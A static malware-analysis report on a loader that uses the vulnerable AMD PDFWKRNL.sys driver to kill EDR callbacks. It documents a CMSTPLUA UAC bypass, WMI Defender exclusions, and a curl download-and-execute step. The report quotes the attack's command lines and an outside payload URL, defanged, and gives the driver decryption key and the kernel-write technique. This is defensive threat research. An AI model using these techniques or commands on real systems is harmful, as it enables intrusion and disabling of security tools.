# BridgeAgent: loader triage (2026-10-16)

Static analysis only. Nothing was executed. Sample from MalwareBazaar, quarantined in samples/<sha256>/.

| SHA-256 | MB first seen | Size | Notes |
|---|---|---|---|
| acb4fdd8eab403dd309015ff8d73334ce7fb1656a627ae837804e59a1b20005a | 2026-10-07 | 5,506,403 | MB file name Loader.exe, MB tags bridgeagent, pdfwkrnl-sys, stealer, vuln-driver. PE32+ GUI, x64. |
| 6e8b49cf70bf854e8c59c7d27cefa89406caf8978461190dabb86dafcd8554e1 | n/a | 80,536 | Embedded driver, decrypted statically (stage2_6e8b49cf70bf854e.bin, mode 0400). AMD PDFWKRNL.sys. MD5 b96d75a000367c200958089728fc5cb8, SHA-1 f329ae0fdf1e198bea6ba787e59cb73f90714002. |

Evidence: evidence/stub_decomp.c (Ghidra 12.1.4 headless, tools/ghidra_scripts/ExportDecomp.java), evidence/decrypted_strings.tsv (tools/bridgeagent_strings.py, regenerated 2026-10-16 with all three decoders). Addresses are VAs in the loader unless marked as driver addresses. Disassembly checks were done with objdump on the quarantined files.

## Summary

The loader is an EDR killer and dropper in one file. It carries an encrypted copy of the AMD PDFWKRNL.sys driver, loads it as a kernel service, and uses its two unchecked memmove IOCTLs to read and write kernel memory. With that it removes process, thread and image-load notify callbacks, object callbacks and registry callbacks that belong to 20 security drivers, strips protected-process status from Defender's MsMpEng.exe and gives it the token of explorer.exe. Before that it adds Defender exclusions over WMI and, when not elevated, tries a CMSTPLUA UAC bypass. Finally it downloads the next stage with curl.exe from a hard-coded URL (overridable with `-u`) and runs it.

## File layout

Observed
- 200 KB native stub followed by a 5,299,043-byte overlay starting at file offset 0x32a00.
- Stub: lld-style build (linker 14.0, `.buildid` section, TimeDateStamp 0xa4a414ea, which decodes to a date in 2057 and reads as a reproducible-build hash, not a build time), UCRT imports. No Go runtime: gopclntab.py finds no pclntab and the file has no `go1.` build string, so MB's `golang_bin_JCorn_CSC846` YARA hit does not describe the stub. No Rust panic strings, rustc paths or `core::`/`alloc::` symbols either, so ANY.RUN's "rust" tag has no static support in this file.
- Version info claims CompanyName "Adobe Inc.", FileDescription and ProductName "Windows Update Service", OriginalFilename helper.exe, version 6.167.22091.3097.
- Overlay: a valid 1x1 PNG (67 bytes), 56 KB of zero bytes, then about 5.2 MB of printable junk and short repeating runs (e.g. a 20-byte run at the very end, 7-to-25-byte runs at overlay+0x100000 and +0x300000). 39,019 distinct 64-byte blocks out of 81,919; zlib ratio 0.42.
- No plain PE in the file, and none under the string key. The driver is present, encrypted under a second key (see "Embedded driver"). This corrects the earlier note that the driver had to be fetched.

Inferred
- The overlay is padding to inflate the file (size-limit evasion for scanners and sandboxes), not a payload. The final payload is not in this file and is fetched at run time.

## String protection

Observed
- Three copies of the same decoder: `FUN_1400056d3`, `FUN_14000ae64` (key schedule cached at 0x1400346a0) and `FUN_140009ca4` (cached at 0x1400345a0). All use AES-256-CTR with the 32-byte key at 0x140017388 (schedule built by `FUN_140006155`) and the initial counter at 0x1400173a8, big-endian counter increment, counter reset for every call. Ciphertexts are packed back to back in .rdata, not NUL-terminated.
- The first pass only covered `FUN_1400056d3`. The other two hold the payload URL, the command-line options, the UAC bypass moniker and 26 more API names (0x140017238..0x1400172ae, 0x14002d9b8..0x14002da39, 0x14002dc42..0x14002dd6e).
- `FUN_14000726e` resolves 21 APIs through the first decoder (globals from 0x140034038): advapi32 OpenSCManagerA, CreateServiceA, OpenServiceA, StartServiceA, CloseServiceHandle, QueryServiceStatus, DeleteService, ControlService, OpenProcessToken, LookupPrivilegeValueA, AdjustTokenPrivileges, RegCreateKeyExA, RegSetValueExA, RegCloseKey; kernel32 VirtualAlloc, VirtualProtect, CreateThread, CreateProcessA, WaitForSingleObject, TerminateProcess.
- A second set is resolved through `FUN_14000ae64` (0x14002dc42..): dbghelp.dll SymSetOptions, SymInitialize, SymLoadModuleEx, SymCleanup, SymUnloadModule64, SymGetTypeInfo, SymGetTypeFromName, SymFromName; GetTokenInformation, K32EnumDeviceDrivers, K32GetDeviceDriverBaseNameA, DeviceIoControl, CreateToolhelp32Snapshot, Process32First, Process32Next, CreateFileMappingA, MapViewOfFile, UnmapViewOfFile, OpenProcess.
- Plain (unencrypted) fragments sit next to the ciphertexts at 0x1400194e0..: `\`, `payload.exe`, `.exe`, `cmd.exe /c start "" "`, `"`, `.exe`, `" "`, `APPDATA`, the alphabet `a..z0..9` (random names), and `\Temp\` at 0x14002d73c. They are appended with the buffered writer `FUN_14000541c`.

## Command line and configuration (observed)

`FUN_140001000` parses argv (CRT `__p___argv`) against strings decoded with `FUN_14000ae64`, then fills a structure for `FUN_1400029e3`:

| Option | Default (decoded) | Effect | Evidence |
|---|---|---|---|
| `-t <name>` | MsMpEng.exe (0x140017238) | process to strip of protection and to re-token | struct +0x00, branch at 0x140001a7a |
| `-s <name>` | explorer.exe (0x140017243) | process whose token is copied into the `-t` process | struct +0x10, branch at 0x140001ad8 |
| `-u <url>` | hxxp://107.175.82[.]242:9000/wilow/staonchik.bin (0x14001724f) | payload URL | struct +0x20, branch at 0x140001c44 |
| `--no-load` | on | skips driver load and the cleanup that follows | flag rbp+0x14d8 (cleared at 0x140001bab) to struct +0x30 |
| `--no-token` | on | skips the token copy | flag rbp+0x1500 (cleared at 0x140001b6c) to struct +0x31 |
| `--no-elevate` | on | skips the elevation check and UAC bypass | flag rbp+0x14e0 (cleared at 0x140001bea), tested at 0x140001ccb |
| `--no-suspend` | n/a | parsed, but the match jumps straight back to the loop (0x140001b33 to 0x140001bf4) without setting anything | dead option in this build |
| `-h` | n/a | help/exit path | 0x140001c84 |

Observed: struct +0x32, which gates copying the System process token into the loader's own process (0x14000502f..0x140005062), is hard-coded to 0 at 0x140002256, so that branch is dead in this build.

Inferred: `NtSuspendProcess` (0x1400198b9) and `SeDebugPrivilege` (0x1400198c9) belonged to the suspend feature that `--no-suspend` controlled. Not traced further.

Answer to the open item on the payload URL: it is hard-coded and encrypted, and an operator can override it at run time with `-u`. Nothing comes from WMI or the registry.

## Elevation and Defender tampering (observed, `FUN_140001000`)

- Elevation check: OpenProcessToken(self, TOKEN_QUERY) then GetTokenInformation(TokenElevation) at 0x140001ce8..0x140001d28.
- Not elevated: PEB masquerade. It rewrites `ProcessParameters.ImagePathName` and `CommandLine` and the matching loader entry's FullDllName and BaseDllName to `%WINDIR%` + `\explorer.exe` (0x14002d9b8), then loads ole32.dll (0x14002da17), calls CoInitializeEx and CoGetObject on `Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` (0x14002d9c5) with BIND_OPTS3 (cbStruct 0x30, dwClassContext 4 = CLSCTX_LOCAL_SERVER). That CLSID is CMSTPLUA, the usual auto-elevating COM object for this UAC bypass.
- Elevated: WMI connection to `root\Microsoft\Windows\Defender`, class `MSFT_MpPreference`, calls Add with `ExclusionPath` set to %APPDATA%, %LOCALAPPDATA%, %TEMP%, `C:\Windows\Temp` and `C:\Users\Public`, and `ExclusionExtension` with the 6-entry (pointer, length) list at 0x14002d7d8: `.exe`, `.sys`, `.dll`, `.ps1`, `.bat`, `.cmd` (plain strings at 0x1400194f1 and 0x14002d838..0x14002d84c). `FUN_140009167` turns each list into a VT_BSTR SAFEARRAY (SafeArrayCreateVector, SysAllocString, SafeArrayPutElement).
- Inferred: the `.sys` exclusion keeps Defender from scanning the dropped PDFWKRNL.sys, and `.exe`, `.dll`, `.ps1`, `.bat` and `.cmd` cover the payload types it launches.
- Inferred: after the bypass it relaunches itself elevated through the CMSTPLUA interface (GetModuleFileNameW at 0x14000227c). The method called through the COM vtable was not traced.

## Embedded driver (observed)

- Ciphertext: 16 chunks, alternating 0x13a9 and 0x13aa bytes, listed as (pointer, length) pairs at 0x14002d5f0 and laid out contiguously from 0x140019b58 to 0x14002d5f0. Total 0x13a98 (80,536) bytes. Copied into one heap buffer in `FUN_1400029e3` (loop after LAB_1400048f0).
- Cipher: AES-256-GCM. Key 32 bytes at 0x14002d70c (5e5ff683f73ec82254f5c5ef628275ea75aa8fbfadb1b67fcf9c38a6f5cbc970). H = AES(K, 0^128) from the zero block at 0x14002d72c. J0 built on the stack from immediates: nonce b4de7d0652fee824f58ce342, counter 1. Empty AAD (length-0 GHASH update). Tag compared with the 16 bytes at 0x14002d6f0 (925ef442854dc9bd47629a316c2f73af); on mismatch the buffer is freed and the routine stops.
- Static decryption with these values verifies the tag and gives an 80,536-byte PE: AMD "USB-C Power Delivery Firmware Update Utility Driver", OriginalFilename PDFWKRNL.sys, FileVersion 1.0, TimeDateStamp 2022-12-22 18:13:53 UTC, Authenticode signed (Advanced Micro Devices Inc., Microsoft Windows Hardware Compatibility Publisher, DigiCert timestamp), device `\Device\PdFwKrnl` / `\DosDevices\PdFwKrnl`. The SHA-256 is in the LOLDrivers list as PDFWKRNL.sys (vulnerable driver).
- Drop: random service name of 6 to 12 characters from `a..z0..9` (0x140034aa4) and a random 8 to 12 character file name plus `.sys` (0x14001991c), using an LCG (multiplier 0x5851f42d4c957f2d, increment 0x14057b7ef767814f). The folder is picked at random from `%WINDIR%\Temp\`, the GetTempPathA folder, and `C:\Users\Public\` (0x140019920). Written with CreateFileA(GENERIC_WRITE) and WriteFile.
- Load: SeLoadDriverPrivilege enabled (0x140019907, AdjustTokenPrivileges), OpenSCManagerA, CreateServiceA with the random name (falls back to OpenServiceA when the service exists, error 0x431), StartServiceA (errors 0xb7 and 0x420 tolerated), then CreateFileA on `\\.\PdFwKrnl` (0x1400198fb) into the global handle 0x140034030. On the way out (if loading was enabled) it closes the handle, stops the service with ControlService and deletes it (from 0x140002cb9).

## Kernel primitives (observed in both files)

| IOCTL | Loader wrapper | Driver handler (driver VA) | Operation |
|---|---|---|---|
| 0x80002028 | `FUN_140007dd5` (read 8 bytes) | 0x1400012c0 | `memmove(in+0x20, in+0x10, in+0x28)`: kernel address at +0x10 copied to the user buffer at +0x20 |
| 0x80002014 | `FUN_140007ce2` (write 8 bytes), `FUN_140007ec6` (write one zero byte) | 0x140001299 | `memmove(in+0x10, in+0x18, in+0x28)`: user buffer at +0x18 copied to the kernel address at +0x10 |

The driver dispatches on `IoControlCode - 0x80002000` (0..0x2c) through a byte index at driver RVA 0x1428 and a jump table at RVA 0x13f4. Both handlers only check that the input length is 0x30, then call the memmove at driver VA 0x1400016c0 with caller-supplied pointers. This matches CVE-2023-20598.

## Kernel symbol resolution (observed)

- Kernel base and driver bases from K32EnumDeviceDrivers; module names from K32GetDeviceDriverBaseNameA.
- `GetSystemDirectoryA` + `\ntoskrnl.exe` (0x140019930) is loaded with dbghelp SymLoadModuleEx. Symbols come from hxxps://msdl.microsoft[.]com/download/symbols/ (0x140019a41), fetched with `curl.exe -s -L --connect-timeout 10 --max-time 120 --retry 1 -A Microsoft-Symbol-Server/10.1700.661.0 -o "` (0x140019a6d).
- Offsets stored in globals: 0x1400341e0 UniqueProcessId, 0x1400341e8 ActiveProcessLinks, 0x1400341f0 Token, 0x1400341f8 SignatureLevel, 0x140034200 SectionSignatureLevel, 0x140034208 Protection (all `_EPROCESS` fields, via SymGetTypeFromName/SymGetTypeInfo); 0x140034210/218/220 PspCreateProcessNotifyRoutine, PspCreateThreadNotifyRoutine, PspLoadImageNotifyRoutine; 0x140034228 CallbackListHead; 0x140034230/238 PsProcessType, PsThreadType; 0x140034240 `_OBJECT_TYPE.CallbackList`; PsInitialSystemProcess for the System EPROCESS.

## EDR blinding (observed)

- Target list: 20 (pointer, length) entries at 0x140019770, compared case-insensitively by `FUN_140007b3d`: WdFilter.sys, MsSecFlt.sys (Microsoft Defender); klif.sys, klflt.sys, klam.sys, klark.sys, kneps.sys, klhk.sys (Kaspersky); dwprot.sys, drwebmon.sys, SpIDer.sys (Dr.Web); eamonm.sys, ekbdflt.sys, epfwwfp.sys (ESET); elastic-endpoint-driver.sys (Elastic); SysmonDrv.sys (Sysmon); CrowdStrike.sys, csagent.sys (CrowdStrike); SentinelMonitor.sys (SentinelOne); fltMgr.sys (Windows Filter Manager).
- Notify routines, `FUN_140007c3c`, called for the three Psp*NotifyRoutine arrays: walks 64 slots, masks the EX_CALLBACK low 4 bits, reads the routine pointer at +8, maps it to the owning driver (`FUN_140007bea`), and writes 0 into the slot through `FUN_140007ce2` when the driver is on the list.
- Object callbacks, `FUN_140007a64`, called for PsProcessType and PsThreadType: walks `_OBJECT_TYPE.CallbackList` and checks the pointer at entry +0x28. If any entry belongs to a listed driver, it sets the list head's Flink and Blink to the head itself, which removes every object callback on that type, including those of products not on the list.
- Registry callbacks: the same walk and the same head reset are inlined in `FUN_1400029e3` for `CallbackListHead` (stub_decomp.c lines 3268 to 3311).
- Process protection: `FUN_140007f48` finds the `-t` process PID by name (toolhelp snapshot), `FUN_140007e5d` finds its EPROCESS by walking ActiveProcessLinks from the System process and comparing UniqueProcessId. It then zeroes the Protection, SignatureLevel and SectionSignatureLevel bytes (0x140004faf..0x140004fcd). Unless `--no-token` is given, it reads the Token of the `-s` process and writes it into the `-t` process (0x14000500b..0x14000501d).
- ActiveProcessLinks is only read. None of the kernel write call sites touch it, so it does not hide processes.

Inferred: with the default arguments, Defender's MsMpEng.exe loses PPL and runs with the medium-integrity token of explorer.exe, so it can no longer scan or protect most of the system, while its kernel callbacks are gone.

## Payload download and launch (observed, `FUN_1400029e3`)

- Command line: `curl.exe -s -L --connect-timeout 10 --max-time 120 -o "` (0x1400172c0) + `<drop path>` + `" "` + `<URL>` + `"`, run with CreateProcessA (CREATE_NO_WINDOW 0x08000000), then WaitForSingleObject.
- The drop path is built by `FUN_14000714e` and `FUN_140007110`, not traced in this pass. Inferred from the earlier string notes: a random name under `C:\Users\Public\`.
- The downloaded file is opened, read whole with ReadFile (call at 0x1400030b0), then deleted with DeleteFileA before parsing.
- Container check: if the buffer is longer than 13 bytes and the last 4 bytes equal 0x0000d1d2, it reads a 16-bit name length at end-0xc and a 32-bit payload size at end-0xa. The name sits just before that trailer, the payload just before the name. The payload is written under the embedded name (fallback "payload.exe", via FUN_140006ea7) and the remaining leading bytes are written by FUN_140006af4.
- Otherwise: if the buffer starts with "MZ" it is run as an executable (`cmd.exe /c start "" "<path>"`); if the target name ends in ".msi" it runs `msiexec.exe /i "<path>" /qn /norestart` (0x1400194c0, 0x1400194cb, 0x1400194d0).

## FLOSS 3.1.1

Observed: FLOSS found 0 stack strings, 1 tight string (`4156500F`) and 34 decoded strings, all short noise from emulating the AES and random-name code (`JoQG`, `TUTU`, `wbmhgnylgz` and similar). It did not recover any of the AES-CTR strings. Nothing to add from it.

## capa 9.4.0 (static, on sample.bin)

Observed: AES encryption and AES constants (2 matches each), runtime linking (57 matches, "link many functions at runtime" x2), parse PE header (5) and enumerate PE sections, anti-VM strings targeting VMware, enumerate GUI resources, initialize Winsock, terminate process (2), file read/write/delete/attributes, environment-variable queries, TLS section. ATT&CK per capa: T1027, T1497.001, T1010, T1083, T1082, T1129.

Inferred: the PE-parsing matches fit the ntoskrnl.exe handling for symbol lookup better than an in-memory loader; the resolved VirtualAlloc/VirtualProtect/CreateThread are not yet tied to a code path. The VMware strings were not traced.

## "stealer" tag

Observed: no browser, wallet, messenger, credential or exfiltration strings in the stub's plain ASCII, plain UTF-16 or decrypted strings, and no imports for DPAPI or SQLite. ANY.RUN's own tags for this sample are pdfwkrnl-sys, vuln-driver, ip-check, bridgeagent, backdoor, loader, rust, evasion, without "stealer".

Inferred: the "stealer" tag describes the downloaded payload (staonchik.bin) or the reporter's wider campaign view, not this loader.

## IOCs (defanged)

- Payload URL: hxxp://107.175.82[.]242:9000/wilow/staonchik.bin
- Payload host: 107.175.82[.]242, TCP 9000
- Loader SHA-256: acb4fdd8eab403dd309015ff8d73334ce7fb1656a627ae837804e59a1b20005a
- Dropped driver SHA-256: 6e8b49cf70bf854e8c59c7d27cefa89406caf8978461190dabb86dafcd8554e1 (legitimate AMD binary, vulnerable)
- Symbol download user agent: Microsoft-Symbol-Server/10.1700.661.0 from curl.exe
- Device: \\.\PdFwKrnl; service and file names are random (6 to 12 and 8 to 12 chars of a-z0-9)
- UAC bypass moniker: Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
- Driver drop folders: C:\Users\Public\, C:\Windows\Temp\, %TEMP%

## Unknown (next)

- The payload itself. The URL is known but nothing was downloaded. Fetching it needs a decision and an isolated host.
- Which CMSTPLUA method is called after CoGetObject, and the exact relaunch command.
- The exact payload drop path (`FUN_14000714e`, `FUN_140007110`).
- What the VMware anti-VM strings gate, and the "ip-check" behaviour ANY.RUN reports.
- Whether the `-t`/`-s` defaults differ in other BridgeAgent builds (needs a second sample).
